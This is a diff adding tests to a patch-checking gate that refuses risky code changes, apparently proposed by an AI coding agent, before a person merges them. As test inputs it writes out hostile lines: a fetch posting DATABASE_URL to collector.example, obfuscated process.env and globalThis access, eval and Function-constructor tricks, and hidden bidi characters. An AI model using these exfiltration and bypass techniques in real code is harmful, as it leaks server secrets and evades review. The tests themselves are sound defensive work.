@@ -13,6 +13,8 @@ import {
   commentFor,
   looksLikeSecret,
   MAX_CHANGED_LINES,
+  MAX_LISTED_PATHS,
+  MAX_PATCH_BYTES,
   parseNumstat,
   readsEnvironment,
 } from "./check-diff.mjs";
@@ -108,6 +110,42 @@ test("groups.ts and the other security modules are refused", () => {
   }
 });
 
+test("a new file that could be loaded in place of a security module is refused", () => {
+  for (const path of [
+    "packages/web/src/lib/groups.tsx",
+    "packages/web/src/lib/group-token.ts.tsx",
+    "packages/web/src/lib/rate-limit.tsx",
+    "packages/web/src/lib/Groups.ts",
+    "packages/web/src/lib/groups.d.ts",
+    "packages/web/src/lib/env.tsx",
+    "packages/web/src/lib/groups/index.ts",
+    "packages/web/src/lib/http.ts/index.ts",
+    "packages/web/src/db.ts",
+  ]) {
+    assert.equal(ruleFor(create(path, ["export const x = 1;"])), "shadows-denied", path);
+  }
+});
+
+test("the same name with a script extension is refused as a shadow before its file type is checked", () => {
+  for (const path of ["packages/web/src/lib/group-token.js", "packages/web/src/lib/groups.mjs", "packages/web/src/lib/text.jsx"]) {
+    assert.equal(ruleFor(create(path, ["export const x = 1;"])), "shadows-denied", path);
+  }
+});
+
+test("new files whose names only resemble a security module, or sit elsewhere, pass", () => {
+  for (const path of [
+    "packages/web/src/lib/group.ts",
+    "packages/web/src/lib/groups-list.ts",
+    "packages/web/src/lib/my-groups.tsx",
+    "packages/web/src/components/groups/list.tsx",
+    "packages/web/src/app/g/[token]/env-note.tsx",
+    "packages/core/src/groups.ts",
+  ]) {
+    assert.equal(checkPatch(create(path, ["export const x = 1;"])).ok, true, path);
+  }
+  assert.equal(checkPatch(modify("packages/web/src/lib/group-view.ts")).ok, true);
+});
+
 test("config, package, lock, env and agent instruction files are refused even under src", () => {
   for (const path of [
     "packages/web/src/site.config.ts",
@@ -121,6 +159,41 @@ test("config, package, lock, env and agent instruction files are refused even un
     "packages/web/src/.claude/settings.json",
   ]) {
     assert.equal(ruleFor(modify(path)), "path-denied", path);
+  }
+});
+
+test("a node_modules folder or any dot-named file or folder under src is refused", () => {
+  for (const path of [
+    "packages/web/src/node_modules/zod/index.js",
+    "packages/web/src/node_modules/zod/index.ts",
+    "packages/web/src/lib/Node_Modules/x.ts",
+    "packages/web/src/.gitignore",
+    "packages/web/src/lib/.gitattributes",
+    "packages/web/src/lib/.npmrc",
+    "packages/web/src/.hidden/page.tsx",
+    "packages/web/src/lib/.fx.ts",
+  ]) {
+    assert.equal(ruleFor(create(path, ["export {};"])), "path-denied", path);
+  }
+});
+
+test("only .ts, .tsx and .css files may change", () => {
+  for (const path of [
+    "packages/web/src/lib/fx.js",
+    "packages/web/src/lib/fx.mjs",
+    "packages/web/src/lib/fx.jsx",
+    "packages/web/src/lib/tsconfig.json",
+    "packages/web/src/lib/data.json",
+    "packages/web/src/app/icon.svg",
+    "packages/web/src/lib/readme.md",
+    "packages/web/src/lib/fx.TS",
+    "packages/web/src/lib/fx",
+  ]) {
+    assert.equal(ruleFor(create(path, ["export {};"])), "file-type", path);
+  }
+  assert.equal(ruleFor(modify("packages/web/src/app/favicon.ico")), "file-type");
+  for (const path of ["packages/web/src/lib/fx.ts", "packages/web/src/app/page.tsx", "packages/web/src/app/globals.css", "packages/web/src/lib/types.d.ts"]) {
+    assert.equal(checkPatch(modify(path)).ok, true, path);
   }
 });
 
@@ -143,6 +216,44 @@ test("a 201-line patch is refused and a 200-line patch passes", () => {
   assert.equal(ruleFor(modify(FX, { add: numberedLines(MAX_CHANGED_LINES + 1) })), "too-large");
   const mixed = modify(FX, { add: numberedLines(150), remove: numberedLines(51) });
   assert.equal(ruleFor(mixed), "too-large");
+});
+
+function patchOfSize(bytes, filler = " ") {
+  const empty = modify(FX, { add: ['export const note = "";'] });
+  const padding = filler.repeat(Math.ceil((bytes - Buffer.byteLength(empty)) / Buffer.byteLength(filler)));
+  return modify(FX, { add: [`export const note = "${padding}";`] });
+}
+
+test("a patch over 200,000 bytes is refused and one of exactly 200,000 bytes passes", () => {
+  const largest = patchOfSize(MAX_PATCH_BYTES);
+  assert.equal(Buffer.byteLength(largest), 200_000);
+  assert.equal(checkPatch(largest).ok, true);
+  const over = patchOfSize(MAX_PATCH_BYTES + 1);
+  assert.equal(Buffer.byteLength(over), 200_001);
+  assert.equal(ruleFor(over), "too-large");
+  const wide = patchOfSize(MAX_PATCH_BYTES + 2, "é");
+  assert.ok(wide.length < MAX_PATCH_BYTES, "two-byte characters keep the text shorter than its bytes");
+  assert.equal(ruleFor(wide), "too-large");
+});
+
+test("a file path that looks like a secret is refused", () => {
+  const path = "packages/web/src/lib/sk-ant-oat01-AbCdEf0123456789AbCdEf0123456789AbCdEf0123456789.ts";
+  assert.equal(ruleFor(create(path, ["export {};"])), "secret-pattern");
+  assert.equal(ruleFor(create("packages/web/src/lib/sk-ant-oat01-x.ts", ["export {};"])), "secret-pattern");
+  assert.equal(ruleFor(create(`packages/web/src/lib/${"deadbeef".repeat(5)}.ts`, ["export {};"])), "secret-pattern");
+  assert.equal(checkPatch(modify("packages/web/src/components/settle-up/settle-up-transfer-list-row.tsx")).ok, true);
+});
+
+test("an added line with an invisible or text-direction character is refused", () => {
+  for (const code of [0x202a, 0x202e, 0x2066, 0x2069, 0x200b, 0x200f, 0xfeff, 0x00ad, 0x2028, 0x2029]) {
+    const line = `const isAdmin = false; // ${String.fromCodePoint(code)}check`;
+    assert.equal(ruleFor(modify(FX, { add: [line] })), "hidden-characters", code.toString(16));
+  }
+  assert.equal(ruleFor(create("packages/web/src/lib/round.ts", ["﻿export const mode = 1;"])), "hidden-characters");
+});
+
+test("visible non-ASCII text such as a currency sign or an accent passes", () => {
+  assert.equal(checkPatch(modify(FX, { add: ['export const label = "Café €12 · split 3 ways …";'] })).ok, true);
 });
 
 test("an added sk- line is refused", () => {
@@ -180,6 +291,98 @@ test("an added process.env line is refused, in any spelling", () => {
   for (const line of ['const e = process["env"];', "const { env } = process;", "const u = import.meta.env.URL;"]) {
     assert.equal(readsEnvironment(line), true, line);
   }
+});
+
+test("the ways the audit reached the database URL are refused", () => {
+  const route = "packages/web/src/app/api/health/route.ts";
+  const audited = [
+    ['import { serverEnv } from "@/lib/env";', 'void fetch("https://collector.example/x", { method: "POST", body: serverEnv().DATABASE_URL });'],
+    ["const p = globalThis.process;", "const url = p.env.DATABASE_URL;"],
+    ['const e = (globalThis as any)["proc" + "ess"]["en" + "v"];'],
+    ["const g = globalThis;", "const x = JSON.stringify(g.process.env);"],
+  ];
+  for (const add of audited) {
+    assert.equal(ruleFor(modify(route, { add })), "process-env", add[0]);
+  }
+  assert.equal(ruleFor(modify(FX, { add: ["const p = globalThis.process;"] })), "process-env");
+  assert.equal(ruleFor(modify(FX, { add: ["const url = serverEnv().DATABASE_URL;"] })), "process-env");
+});
+
+test("every named sign of server secrets or code from text is refused, spaced or not", () => {
+  for (const line of [
+    "const p = process;",
+    "const g = globalThis;",
+    "const e = serverEnv();",
+    'const k = "DATABASE_URL";',
+    "const c = pool.options.connectionString;",
+    "const u = import.meta.url;",
+    "const u = import . meta;",
+    'const v = eval("1");',
+    'const v = eval ("1");',
+    'const f = Function("return 1");',
+    'const f = new Function ("return 1");',
+    'const m = require("node:fs");',
+    "const m = require ('node:fs');",
+    'import { serverEnv as s } from "@/lib/env";',
+    "import * as e from '@/lib/env.ts';",
+    'import { serverEnv } from "../lib/env";',
+    'export * from "./env";',
+    'const m = await import(`../../lib/env.js`);',
+  ]) {
+    assert.equal(readsEnvironment(line), true, line);
+  }
+});
+
+test("the follow-up bypasses found after the audit are refused", () => {
+  for (const line of [
+    'const p = global["proc" + "ess"];',
+    "const p = global.process;",
+    'const F = [].constructor.constructor("return this")();',
+    'const m = await import("@/lib/" + "e" + "nv");',
+    "const leak = withDb((db) => JSON.stringify(db.$client.options));",
+    '"use server";',
+    "'use server';",
+  ]) {
+    assert.equal(readsEnvironment(line), true, line);
+  }
+  for (const path of ["packages/web/src/instrumentation.ts", "packages/web/src/instrumentation-client.ts"]) {
+    assert.equal(ruleFor(create(path, ["export function register() {}"])), "new-endpoint", path);
+  }
+});
+
+test("ordinary code near those words passes", () => {
+  for (const line of [
+    'const label = "Settle up";',
+    'import { envelope } from "@/lib/envelope";',
+    'import { environmentName } from "./environment";',
+    "const total = splits.reduce((sum, split) => sum + split.amount, 0);",
+    "const evaluate = (x: number) => x * 2;",
+    'import "./globals.css";',
+    'import { allocate } from "@penny/core";',
+    "const globalTotal = 0;",
+  ]) {
+    assert.equal(readsEnvironment(line), false, line);
+  }
+});
+
+test("a new route handler, middleware or proxy file is refused anywhere", () => {
+  for (const path of [
+    "packages/web/src/app/api/leak/route.ts",
+    "packages/web/src/app/api/leak/route.tsx",
+    "packages/web/src/app/(x)/Route.ts",
+    "packages/web/src/lib/route.ts",
+    "packages/web/src/middleware.ts",
+    "packages/web/src/proxy.ts",
+    "packages/core/src/proxy.ts",
+  ]) {
+    assert.equal(ruleFor(create(path, ["export const x = 1;"])), "new-endpoint", path);
+  }
+});
+
+test("an edit to an existing route handler, and a new page, pass", () => {
+  assert.equal(checkPatch(modify("packages/web/src/app/api/groups/route.ts")).ok, true);
+  assert.equal(checkPatch(create("packages/web/src/app/about/page.tsx", ["export default function About() { return null; }"])).ok, true);
+  assert.equal(checkPatch(create("packages/web/src/lib/router-state.ts", ["export {};"])).ok, true);
 });
 
 test("removing a line that read the environment is allowed", () => {
@@ -278,8 +481,23 @@ test("the comment lists the changed files and says a person merges, or names the
   assert.match(passed, /- `packages\/web\/src\/lib\/fx\.ts`\n- `packages\/core\/src\/round\.ts` \(new\)/);
   assert.match(passed, /TestSprite will test the new preview\. A person merges\./);
   const refused = commentFor({ ok: false, rule: "too-large" });
-  assert.match(refused, /Rule: `too-large`\. The patch changes more than 200 lines\./);
+  assert.match(refused, /Rule: `too-large`\. The patch changes more than 200 lines or is larger than 200,000 bytes\./);
   assert.match(refused, /nothing was pushed/);
+});
+
+test("the comment lists at most 30 paths, then says how many more files changed", () => {
+  const files = (count) => Array.from({ length: count }, (_, n) => ({ path: `packages/web/src/lib/f${n}.ts`, isNew: false, added: 1, removed: 0 }));
+  const many = commentFor({ ok: true, files: files(33), changedLines: 33 });
+  assert.equal((many.match(/^- `/gm) ?? []).length, MAX_LISTED_PATHS);
+  assert.match(many, /- `packages\/web\/src\/lib\/f29\.ts`\n- and 3 more files\n/);
+  assert.ok(!many.includes("f30.ts"));
+  assert.match(commentFor({ ok: true, files: files(31), changedLines: 31 }), /- and 1 more file\n/);
+  const exact = commentFor({ ok: true, files: files(30), changedLines: 30 });
+  assert.equal((exact.match(/^- `/gm) ?? []).length, 30);
+  assert.ok(!exact.includes("more file"));
+  const real = checkPatch(Array.from({ length: 31 }, (_, n) => create(`packages/web/src/lib/n${n}.ts`, ["export {};"])).join(""));
+  assert.equal(real.ok, true);
+  assert.match(commentFor(real), /- and 1 more file\n/);
 });
 
 function git(dir, ...args) {
